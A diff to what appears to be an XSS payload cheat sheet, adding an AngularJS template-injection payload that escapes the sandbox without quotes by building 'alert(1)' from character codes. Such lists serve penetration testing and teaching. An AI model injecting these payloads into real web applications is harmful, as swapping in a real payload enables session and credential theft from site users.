@@ -149,6 +149,14 @@ AngularJS 1.0.1 - 1.1.5 and Vue JS
 {{constructor.constructor('alert(1)')()}}
 ```
 
+### Advanced bypassing XSS
+
+AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)
+
+```javascript
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+```
+
 
 ### Blind XSS
 
